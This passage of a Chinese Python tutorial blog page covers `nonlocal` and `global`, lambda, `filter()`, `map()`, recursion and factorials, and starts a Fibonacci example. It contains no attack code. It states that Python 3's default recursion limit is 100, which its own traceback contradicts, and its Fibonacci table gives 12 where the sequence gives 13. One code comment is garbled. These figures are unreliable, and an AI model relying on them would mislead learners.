之前只能间接的通过容器类型来存放，因为容器类型不是放在栈里，所以不会被 “屏蔽”。字符串、列表、元组，这些啥都可以往里放的就是容器类型。可以把代码改成：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*=</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span> <span class=\"token comment\"># \"_\" 代表上一条语句的结果</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'list'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 把 “x [0] = x ” 了</span></pre></td></tr></table></figure><p>到 Python3 里有一个关键字 nonlocal 可以使用，使用方法跟 global 一样</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        x <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">nonlocal</span> x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            x <span class=\"token operator\">*=</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">25</span></pre></td></tr></table></figure><p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hjeWFuc3VuL2FydGljbGUvZGV0YWlscy83OTY3MjYzNA==\"> Python 中关键字 global 与 nonlocal 的区别</span></p>\n<p>第一，两者的功能不同。global 关键字修饰变量后标识该变量是全局变量，对该变量进行修改就是修改全局变量，而 nonlocal 关键字修饰变量后标识该变量是上一级函数中的局部变量，如果上一级函数中不存在该局部变量，nonlocal 位置会发生错误（最上层的函数使用 nonlocal 修饰变量必定会报错）。</p>\n<p>第二，两者使用的范围不同。global 关键字可以用在任何地方，包括最上层函数中和嵌套函数中，即使之前未定义该变量，global 修饰后也可以直接使用，而 nonlocal 关键字只能用于嵌套函数中，并且外层函数中定义了相应的局部变量，否则会发生错误（见第一）</p>\n<h3 id=\"匿名函数\"><a class=\"anchor\" href=\"#匿名函数\">#</a> 匿名函数</h3>\n<p>Python 之父想删除的一个函数。。。。。</p>\n<p>匿名函数：<br />\nlambda 形参 1, 形参 2：执行语句</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> g <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span>x<span class=\"token operator\">*</span>y</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> g<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">36</span></pre></td></tr></table></figure><h3 id=\"介绍两个biffilter和map\"><a class=\"anchor\" href=\"#介绍两个biffilter和map\">#</a> 介绍两个 BIF：filter () 和 map ()</h3>\n<p>Python 中的 BIF 就是 Built-in Functions, 即内置函数 (装 x 呀)</p>\n<h4 id=\"filter\"><a class=\"anchor\" href=\"#filter\">#</a> filter()</h4>\n<p>第一个内建函数就是过滤器</p>\n<p>看看 python 中的注释</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">help</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">filter</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Help on <span class=\"token keyword\">class</span> <span class=\"token class-name\">filter</span> <span class=\"token keyword\">in</span> module builtins<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">filter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token operator\">|</span>  <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span>function <span class=\"token keyword\">or</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> iterable<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">filter</span> <span class=\"token builtin\">object</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token operator\">|</span>  Return an iterator yielding those items of iterable <span class=\"token keyword\">for</span> which function<span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token operator\">|</span>  <span class=\"token keyword\">is</span> true<span class=\"token punctuation\">.</span> If function <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">return</span> the items that are true<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token operator\">|</span>  Methods defined here<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token operator\">|</span>  __getattribute__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token operator\">|</span>      Return <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token operator\">|</span>  __iter__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> <span class=\"token operator\">|</span>      Implement <span class=\"token builtin\">iter</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token operator\">|</span>  __next__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token operator\">|</span>      Implement <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre> <span class=\"token operator\">|</span>  __reduce__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> <span class=\"token operator\">|</span>      Return state information <span class=\"token keyword\">for</span> pickling<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre> <span class=\"token operator\">|</span>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre> <span class=\"token operator\">|</span>  Static methods defined here<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre> <span class=\"token operator\">|</span>  __new__<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> builtins<span class=\"token punctuation\">.</span><span class=\"token builtin\">type</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> <span class=\"token operator\">|</span>      Create <span class=\"token keyword\">and</span> <span class=\"token keyword\">return</span> a new <span class=\"token builtin\">object</span><span class=\"token punctuation\">.</span>  See <span class=\"token builtin\">help</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> accurate signature<span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>大致意思是：filter 有两个参数。第一个参数可以是一个函数也可以是 None, 如果是一个函数的话，则将第二个可迭代的数据里的每一个元素作为函数的参数进行计算，把返回为 True 的值筛选出来；如果第一个参数为 None，则直接将第二个参数中为 True 的值筛选出来。</p>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t <span class=\"token operator\">=</span> <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">filter</span> <span class=\"token builtin\">object</span> at <span class=\"token number\">0x000001DC49317070</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>结合 lambda 函数写一个奇数过滤器</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> x <span class=\"token operator\">%</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h4 id=\"map\"><a class=\"anchor\" href=\"#map\">#</a> map()</h4>\n<p>map 在这里不是地图的意思，在编程领域里，map 一般做 “映射” 来解释。</p>\n<p>map () 这个内置函数也有两个参数，仍然是一个函数和一个可迭代序列，将序列的每一个元素作为函数的参数进行运算加工，知道可迭代序列每个元素都加工完毕，返回所有加工后的元素构成的新序列。</p>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">map</span> <span class=\"token builtin\">object</span> at <span class=\"token number\">0x000001DC49317610</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#68>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>TypeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'NoneType'</span> <span class=\"token builtin\">object</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">callable</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#空类型不能调用</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> x <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">map</span> <span class=\"token builtin\">object</span> at <span class=\"token number\">0x000001DC49317A60</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"递归\"><a class=\"anchor\" href=\"#递归\">#</a> 递归</h3>\n<p>什么是递归？递归，就是在运行的过程中调用自己。</p>\n<p>先举个实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">re</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#3>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#2>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> re</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#2>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> re</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#2>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> re</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    re<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">[</span>Previous line repeated <span class=\"token number\">1022</span> more times<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>RecursionError<span class=\"token punctuation\">:</span> maximum recursion depth exceeded</pre></td></tr></table></figure><p>这就是初学者玩递归最容易出现的错误。从理论上讲这个程序将永远执行下去直至耗尽所有内存资源。不过 Python3 出于 “善意的保护”，对递归的深度默认限制是 100 层，所以你的代码才会停下来。不过如果你写网络爬虫等工具，可能会爬得很深，那你也可以自己设置递归的深度限制。方法如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> sys<span class=\"token punctuation\">.</span>setrecursionlimit<span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#将递归限制设置为 100 万层</span></pre></td></tr></table></figure><p>写一个求阶乘的函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 非递归版本 （迭代）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">re</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        result <span class=\"token operator\">=</span> n</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            result <span class=\"token operator\">*=</span> i</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> re<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">720</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#递归版本</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">recursion</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">return</span> n<span class=\"token operator\">*</span> recursion<span class=\"token punctuation\">(</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">720</span></pre></td></tr></table></figure><p>有一句话 “普通程序员用迭代，天才程序员用递归”。但并不是把所有的迭代都用递归代替就是 “天才程序员”，恰恰相反。因为递归的实现是函数调用自己，每次函数的调用都需要进行压栈、弹栈、保存和恢复寄存器的栈操作，所以会非常消耗时间和空间的。不过，存在即合理，没必要讨论那个好。递归用在妙处，自然代码简洁、精炼。</p>\n<p>斐波那契数列</p>\n<p>斐波那契数列是意大利数学家列昂纳多・斐波那契发明的。</p>\n<p>问题：如果兔子在出生两个月后就拥有繁衍能力，这对兔子每个月能生一对小兔子来，假设所有兔子都不会死亡，那么一年后会有多少兔子？</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:right\">月数</th>\n<th style=\"text-align:right\">1</th>\n<th style=\"text-align:right\">2</th>\n<th style=\"text-align:right\">3</th>\n<th style=\"text-align:right\">4</th>\n<th style=\"text-align:right\">5</th>\n<th style=\"text-align:right\">6</th>\n<th style=\"text-align:right\">7</th>\n<th style=\"text-align:right\">8</th>\n<th style=\"text-align:right\">9</th>\n<th style=\"text-align:right\">10</th>\n<th style=\"text-align:right\">11</th>\n<th style=\"text-align:right\">12</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:right\">兔子</td>\n<td style=\"text-align:right\">1</td>\n<td style=\"text-align:right\">1</td>\n<td style=\"text-align:right\">2</td>\n<td style=\"text-align:right\">3</td>\n<td style=\"text-align:right\">5</td>\n<td style=\"text-align:right\">8</td>\n<td style=\"text-align:right\">12</td>\n<td style=\"text-align:right\">21</td>\n<td style=\"text-align:right\">34</td>\n<td style=\"text-align:right\">55</td>\n<td style=\"text-align:right\">89</td>\n<td style=\"text-align:right\">144</td>\n</tr>\n</tbody>\n</table>\n<p>用数学函数来定义</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#不会 md 文件的数学语法（我是笨比）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>          <span class=\"token number\">1</span>               当n<span class=\"token operator\">=</span><span class=\"token number\">1</span>时</pre></td></tr><tr><td 